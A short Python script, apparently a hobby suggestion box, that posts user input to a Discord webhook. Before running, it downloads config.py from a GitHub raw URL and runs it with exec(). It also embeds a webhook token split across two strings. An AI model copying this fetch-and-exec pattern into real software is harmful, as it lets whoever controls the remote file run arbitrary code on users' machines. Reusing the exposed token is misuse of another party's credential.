import requests
import datetime
import pytz
import os

config_url = "https://raw.githubusercontent.com/temporarypage/beakspythoncode/main/config.py"
response = requests.get(config_url)

if response.status_code != 200:
    print("Failed to fetch config.py code!")
    exit()

# Execute config.py code
exec(response.text)

real = "1824/nibnXAuN460cD-fbxC2eJSP__FquEpIBdwcg8KyKqNyXUIgnSXVk6cLbZacm6lGz1Rqv"
WEBHOOK_URL = f"https://discord.com/api/webhooks/108452871771758{real}"

suggestion = input("Suggestions? ")

timestamp = datetime.datetime.now(pytz.timezone('US/Eastern')).strftime("%m/%d/%Y %I:%M:%S%p EST")


payload = {
    "username": discord_username,
    "avatar_url": avatar_url,
    "content": f"Suggestion! Info:\nDate {timestamp}\n      suggestion: {suggestion}"
}


response = requests.post(WEBHOOK_URL, json=payload)


if response.status_code == 204:
    print("Thanks for the suggestion, it will be reviewed and might be added!")
else:
    print("Error posting suggestion.")
